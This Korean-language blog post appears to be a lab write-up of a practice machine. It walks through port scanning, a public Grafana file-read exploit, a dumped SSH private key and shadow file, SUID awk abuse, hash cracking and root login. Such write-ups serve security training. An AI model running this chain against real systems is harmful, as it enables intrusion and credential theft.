---
title: '[BHPT] Observer'
layout: post
date: 2026-11-09 12:00:00 +0900
---

# 1. observer 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 5일 ~ 2025년 12월 6일 | observer | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 00:05 EST
Nmap scan report for TARGET_IP
Host is up (0.010s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
3000/tcp open  ppp
8000/tcp open  http-alt
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds

```
포트 스캔 결과 포트 21, 22, 3000, 8000, 8080이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 21,22,3000,8000,8080 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 00:09 EST
Nmap scan report for TARGET_IP
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:d3:ea:60:89:9f:99:5f:70:ba:92:df:21:c4:42:cc (ECDSA)
|_  256 81:40:c5:c1:eb:fa:11:72:0d:5e:ea:4a:ff:a1:4c:5c (ED25519)
3000/tcp open  http    Grafana http
| http-robots.txt: 1 disallowed entry 
|_/
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
8000/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-generator: WordPress 6.3.1
|_http-server-header: Apache/2.4.56 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: toorg Internal Blog Dev
8080/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: phpMyAdmin
|_http-server-header: Apache/2.4.57 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds
```

3000번 포트에 Grafana를 사용한 웹이 있어, 페이지 접속 후 하단에 버전을 확인했다.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-observer/image.png)


grafana 8.3.0 searchsploit 시 Directory Traversal and Arbitrary File 익스플로잇 확인.

```
└─$ searchsploit grafana 8.3.0                                                                
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                                                      | multiple/webapps/50581.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

익스플로잇 코드 실행 및 /etc/passwd 파일 출력 성공하였으며, uid가 1000이상인 miller계정 발견.
```
└─$ python3 /usr/share/exploitdb/exploits/multiple/webapps/50581.py -H http://TARGET_IP:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:115:122::/usr/share/grafana:/bin/false
ftp:x:116:124:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
miller:x:1001:1001::/home/miller:/bin/bash
```

miller 유저의 홈 디렉토리의 .ssh 디렉토리에서 SSH키 확보
```
Read file > /home/miller/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### 초기 침투

확보 한 키를 복사하여 공격자 호스트에 저장한 뒤, 권한으러 600 부여.
```
┌──(kali㉿kali)-[~/Desktop/observer]
└─$ vi key                  
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/observer]
└─$ chmod 600 key                  
```

ssh -i 옵션을 통해 저장한 키로 miller 게정 접속 성공.
```                                      
┌──(kali㉿kali)-[~/Desktop/observer]
└─$ ssh miller@TARGET_IP -i key
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1025-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  6 05:38:32 UTC 2025

  System load:                      0.009765625
  Usage of /:                       60.2% of 7.57GB
  Memory usage:                     31%
  Swap usage:                       0%
  Processes:                        134
  Users logged in:                  0
  IPv4 address for br-11fa18e5a6e5: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens5:            TARGET_IP

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

120 updates can be applied immediately.
67 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

miller@ip-172-31-200-36:~$ id
uid=1001(miller) gid=1001(miller) groups=1001(miller)
```

### 권한 상승

find 명령어를 이용하여 SUID 정보 수집.
```
miller@ip-172-31-200-36:~$ find /usr/bin -perm -4000
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/mount
/usr/bin/gawk
```
GTFOBins 사이트에서 SUID를 통해 권한 상승이 가능하다는 것을 확인함.

![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-observer/image-1.png)

gawk를 시도해봤지만 실행이 불가능하여, awk로 대채하여 명령을 실행하여 /etc/shadow파일 확보 성공.

```
miller@ip-172-31-200-36:~$ LFILE=/etc/shadow
miller@ip-172-31-200-36:~$ awk '//' "$LFILE"
root:[REDACTED_HASH]
daemon:*:19493:0:99999:7:::
bin:*:19493:0:99999:7:::
sys:*:19493:0:99999:7:::
sync:*:19493:0:99999:7:::
games:*:19493:0:99999:7:::
man:*:19493:0:99999:7:::
lp:*:19493:0:99999:7:::
mail:*:19493:0:99999:7:::
news:*:19493:0:99999:7:::
uucp:*:19493:0:99999:7:::
proxy:*:19493:0:99999:7:::
www-data:*:19493:0:99999:7:::
backup:*:19493:0:99999:7:::
list:*:19493:0:99999:7:::
irc:*:19493:0:99999:7:::
gnats:*:19493:0:99999:7:::
nobody:*:19493:0:99999:7:::
systemd-network:*:19493:0:99999:7:::
systemd-resolve:*:19493:0:99999:7:::
messagebus:*:19493:0:99999:7:::
systemd-timesync:*:19493:0:99999:7:::
syslog:*:19493:0:99999:7:::
_apt:*:19493:0:99999:7:::
tss:*:19493:0:99999:7:::
uuidd:*:19493:0:99999:7:::
tcpdump:*:19493:0:99999:7:::
sshd:*:19493:0:99999:7:::
pollinate:*:19493:0:99999:7:::
landscape:*:19493:0:99999:7:::
fwupd-refresh:*:19493:0:99999:7:::
ec2-instance-connect:!:19493:0:99999:7:::
_chrony:*:19493:0:99999:7:::
ubuntu:!:19614:0:99999:7:::
lxd:!:19614::::::
grafana:*:19614:0:99999:7:::
ftp:*:19614:0:99999:7:::
miller:$1$KIoXESoo$qoF7GxB7TWsQt8yNDyAuf.:20428:0:99999:7:::
```

test.txt에 shadow파일에서 가져온 해쉬값 저장 후, john the riper 툴을 사용하여 해시 크래킹 시도하면 [REDACTED_PASSWORD] 비밀번호를 발견함.
```
└─$ john test.txt  
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
[REDACTED_PASSWORD]          (root)     
1g 0:00:00:14 DONE 3/3 (2025-12-06 01:20) 0.07057g/s 190070p/s 190070c/s 190070C/s lamsie7..larie01
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
크래킹한 비밀번호로 로그인하면 root로 접속 성공.

```
└─$ ssh root@TARGET_IP                                    
root@TARGET_IP's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1025-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  6 06:22:19 UTC 2025

  System load:                      0.0390625
  Usage of /:                       60.2% of 7.57GB
  Memory usage:                     41%
  Swap usage:                       0%
  Processes:                        135
  Users logged in:                  0
  IPv4 address for br-11fa18e5a6e5: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens5:            TARGET_IP

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

120 updates can be applied immediately.
67 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 14 05:07:19 2023 from TARGET_IP
root@ip-172-31-200-36:~# id
uid=0(root) gid=0(root) groups=0(root)
```


